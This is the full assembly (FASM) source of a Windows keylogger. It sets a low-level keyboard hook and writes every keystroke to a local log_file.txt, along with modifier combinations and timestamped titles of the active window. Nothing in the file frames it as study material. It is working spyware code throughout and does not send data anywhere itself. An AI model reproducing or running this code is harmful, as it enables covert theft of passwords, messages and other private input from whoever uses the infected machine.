    
    format PE GUI 5.0       ; Subsystem Version (min Windows 2000)

;   =========================================================
    section '.code' code import writeable readable executable
;   =========================================================

    include 'win32ax.inc'
    include 'macro/SWITCH.inc'

;   =====================
    include 'iat.imports'
;   =====================


    FILE_APPEND_DATA = 0x0004

struct KBDLLHOOKSTRUCT
    vkCode          rd 1
    scanCode        rd 1
    flags           rd 1
    time            rd 1
    dwExtraInfo     rd 1
ends


proc WriteToFile uses esi, wText
    locals
        dwBytesWritten      rd 1
        hFile               rd 1
    endl

    invoke CreateFileW, log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    .if eax <> INVALID_HANDLE_VALUE
        mov [hFile], eax
        invoke lstrlenW, [wText]
        imul eax, 2
        invoke WriteFile, [hFile], [wText], eax, addr dwBytesWritten, NULL
        .if eax = 1
            invoke CloseHandle, [hFile]
            xor eax, eax
            inc eax
            ret
        .endif
    .endif

    xor eax, eax
    ret
endp


proc LowLevelKeyboardProc uses esi, nCode, wParam, lParam
    locals
        newWindow           du 256      dup (?)
        oldWindow           du 256      dup (?)
        appName             du 1024     dup (?)
        szKey               du 256      dup (?)
        buff                du 256      dup (?)
        wChar               du 16       dup (?)
        hWindowHandle       rd 1
        dwMsg               rd 1
        dwProcessId         rd 1
    endl

    .if (([nCode] = HC_ACTION) & (([wParam] = WM_SYSKEYDOWN) | ([wParam] = WM_KEYDOWN)))

        mov esi, [lParam]
        virtual at esi
            kbHook KBDLLHOOKSTRUCT <>
        end virtual

        mov eax, [kbHook.flags]
        shl eax, 0x8
        add eax, [kbHook.scanCode]
        shl eax, 0x10
        inc eax
        invoke GetKeyNameTextW, eax, addr szKey, 256

        invoke GetForegroundWindow
        .if eax <> NULL
            mov [hWindowHandle], eax
            invoke GetWindowTextW, [hWindowHandle], addr newWindow, 1024
            .if eax <> 0
                invoke lstrcmpW, addr newWindow, addr oldWindow
                .if eax <> 0                
                    invoke GetLocalTime, LocalTime

                    movzx eax, word[LocalTime.wSecond]
                    push eax

                    movzx eax, word[LocalTime.wMinute]
                    push eax

                    movzx eax, word[LocalTime.wHour]
                    push eax

                    movzx eax, word[LocalTime.wYear]
                    push eax

                    movzx eax, word[LocalTime.wMonth]
                    push eax

                    movzx eax, word[LocalTime.wDay]
                    push eax

                    cinvoke wsprintfW, addr appName, tittleFrmt, addr newWindow
                    stdcall WriteToFile, addr appName
                    .if eax = 1
                        invoke lstrcpyW, addr oldWindow, addr newWindow
                    .endif
                .endif

            .endif

            invoke GetKeyState, VK_LCONTROL
            mov ecx, 32768
            test cx, ax
            je @f
                .if [kbHook.vkCode] <> VK_LCONTROL
                    cinvoke wsprintfW, addr buff, sfrmtLcontrol, addr szKey
                    stdcall WriteToFile, addr buff
                    jmp next
                .endif
        @@: invoke GetKeyState, VK_RCONTROL
            mov ecx, 32768
            test cx, ax
            je @f
                .if [kbHook.vkCode] <> VK_RCONTROL
                    cinvoke wsprintfW, addr buff, sfrmtRcontrol, addr szKey
                    stdcall WriteToFile, addr buff
                    jmp next
                .endif
        @@: invoke GetKeyState, VK_LMENU
            mov ecx, 32768
            test cx, ax
            je @f
                .if [kbHook.vkCode] <> VK_LMENU
                    cinvoke wsprintfW, addr buff, sfrmtLmenu, addr szKey
                    stdcall WriteToFile, addr buff
                    jmp next
                .endif
        @@: invoke GetKeyState, VK_RMENU
            mov ecx, 32768
            test cx, ax
            je @f
                .if [kbHook.vkCode] <> VK_RMENU
                    cinvoke wsprintfW, addr buff, sfrmtRmenu, addr szKey
                    stdcall WriteToFile, addr buff
                    jmp next
                .endif
        @@: invoke GetKeyState, VK_LWIN
            mov ecx, 32768
            test cx, ax
            je @f
                .if [kbHook.vkCode] <> VK_LWIN
                    cinvoke wsprintfW, addr buff, sfrmtLwin, addr szKey
                    stdcall WriteToFile, addr buff
                    jmp next
                .endif
        @@: invoke GetKeyState, VK_RWIN
            mov ecx, 32768
            test cx, ax
            je @f
                .if [kbHook.vkCode] <> VK_RWIN
                    cinvoke wsprintfW, addr buff, sfrmtRwin, addr szKey
                    stdcall WriteToFile, addr buff
                    jmp next
                .endif
        @@: switch [kbHook.vkCode]

                case VK_BACK
                    stdcall WriteToFile, sBackspace
                    break

                case VK_TAB
                    stdcall WriteToFile, sTab
                    break

                case VK_RETURN
                    stdcall WriteToFile, sEnter
                    break

                case VK_PAUSE
                    stdcall WriteToFile, sPause
                    break

                case VK_CAPITAL
                    stdcall WriteToFile, sCapsLock
                    break

                case VK_ESCAPE
                    stdcall WriteToFile, sEsc
                    break

                case VK_PRIOR
                    stdcall WriteToFile, sPageUp
                    break

                case VK_NEXT
                    stdcall WriteToFile, sPageDown
                    break

                case VK_END
                    stdcall WriteToFile, sEnd
                    break

                case VK_HOME
                    stdcall WriteToFile, sHome
                    break

                case VK_LEFT
                    stdcall WriteToFile, sLeft
                    break

                case VK_UP
                    stdcall WriteToFile, sUp
                    break

                case VK_RIGHT
                    stdcall WriteToFile, sRight
                    break

                case VK_DOWN
                    stdcall WriteToFile, sDown
                    break

                case VK_SNAPSHOT
                    stdcall WriteToFile, sPrintScreen
                    break

                case VK_INSERT
                    stdcall WriteToFile, sIns
                    break

                case VK_DELETE
                    stdcall WriteToFile, sDel
                    break

                case VK_F1
                    stdcall WriteToFile, sF1
                    break

                case VK_F2
                    stdcall WriteToFile, sF2
                    break

                case VK_F3
                    stdcall WriteToFile, sF3
                    break

                case VK_F4
                    stdcall WriteToFile, sF4
                    break

                case VK_F5
                    stdcall WriteToFile, sF5
                    break

                case VK_F6
                    stdcall WriteToFile, sF6
                    break

                case VK_F7
                    stdcall WriteToFile, sF7
                    break

                case VK_F8
                    stdcall WriteToFile, sF8
                    break

                case VK_F9
                    stdcall WriteToFile, sF9
                    break

                case VK_F10
                    stdcall WriteToFile, sF10
                    break

                case VK_F11
                    stdcall WriteToFile, sF11
                    break

                case VK_F12
                    stdcall WriteToFile, sF12
                    break

                case VK_NUMLOCK
                    stdcall WriteToFile, sNumLock
                    break

                case VK_SCROLL
                    stdcall WriteToFile, sScrollLock
                    break

                case VK_APPS
                    stdcall WriteToFile, sApplications
                    break

                default
                    invoke VirtualAlloc, 0, 256, MEM_COMMIT, PAGE_EXECUTE_READWRITE
                    mov edi, eax

                    invoke GetKeyboardState, edi
                    .if eax <> 0
                        invoke GetKeyState, VK_SHIFT
                        mov [edi + VK_SHIFT], al

                        invoke GetKeyState, VK_CAPITAL
                        mov [edi + VK_CAPITAL], al

                        invoke GetForegroundWindow
                        invoke GetWindowThreadProcessId, eax, addr dwProcessId
                        invoke GetKeyboardLayout, eax

                        invoke ToUnicodeEx, [kbHook.vkCode], [kbHook.scanCode], edi, addr wChar, 16, [kbHook.flags], eax
                        stdcall WriteToFile, addr wChar
                    .endif

                    invoke VirtualFree, edi, 0, MEM_RELEASE
                    break
            endsw

        .endif
    .endif


next:
    invoke CallNextHookEx, [hKeyHook], [nCode], [wParam], [lParam]
    ret
endp


proc KeyLogger uses edi, lpParameter
    locals
        msg         MSG
    endl

    invoke GetModuleHandleA, NULL
    test eax, eax
    jne @f

    invoke LoadLibraryA, [lpParameter]
    test eax, eax
    jne @f
    inc eax
    jmp exit

@@: invoke SetWindowsHookExA, WH_KEYBOARD_LL, LowLevelKeyboardProc, eax, NULL
    mov [hKeyHook], eax

@@: invoke GetMessageA, addr msg, 0, 0, 0
    test eax, eax
    je exit
    invoke TranslateMessage, addr msg
    invoke DispatchMessageA, addr msg
    jmp @b

    invoke UnhookWindowsHookEx, addr hKeyHook
    xor eax, eax
exit:
    ret
endp


;   =========================================================
;           ENTRY POINT
;   =========================================================
entry $

    invoke CreateThread, NULL, NULL, KeyLogger, NULL, NULL, dwThread
    test eax, eax
    je @f

    invoke WaitForSingleObject, eax, -1
    jmp Exit

@@: xor eax, eax
    inc eax
Exit:
    ret

    tittleFrmt              du 10, 10, '[%s] - %02d/%02d/%04d, %02d:%02d:%02d', 10, 0
    log_file                du 'log_file.txt',      0
    
    sfrmtLcontrol           du '[CtrlL + %s]',      0
    sfrmtRcontrol           du '[CtrlR + %s]',      0
    sfrmtLmenu              du '[AltL + %s]',       0
    sfrmtRmenu              du '[AltR + %s]',       0
    sfrmtLwin               du '[WinL + %s]',       0
    sfrmtRwin               du '[WinR + %s]',       0

    sBackspace              du '[Backspace]',       0
    sTab                    du '[Tab]',             0
    sEnter                  du '[Enter]', 10,       0
    sPause                  du '[Pause]',           0
    sCapsLock               du '[Caps Lock]',       0
    sEsc                    du '[Esc]',             0
    sPageUp                 du '[Page Up]',         0
    sPageDown               du '[Page Down]',       0
    sEnd                    du '[End]',             0
    sHome                   du '[Home]',            0
    sLeft                   du '[Left]',            0
    sUp                     du '[Up]',              0
    sRight                  du '[Right]',           0
    sDown                   du '[Down]',            0
    sPrintScreen            du '[Print Screen]',    0
    sIns                    du '[Ins]',             0
    sDel                    du '[Del]',             0
    sF1                     du '[F1]',              0
    sF2                     du '[F2]',              0
    sF3                     du '[F3]',              0
    sF4                     du '[F4]',              0
    sF5                     du '[F5]',              0
    sF6                     du '[F6]',              0
    sF7                     du '[F7]',              0
    sF8                     du '[F8]',              0
    sF9                     du '[F9]',              0
    sF10                    du '[F10]',             0
    sF11                    du '[F11]',             0
    sF12                    du '[F12]',             0
    sNumLock                du '[Num Lock]',        0
    sScrollLock             du '[Scroll Lock]',     0
    sApplications           du '[Applications]',    0

    LocalTime               SYSTEMTIME <>
    dwThread                rd 1
    hKeyHook                rd 1
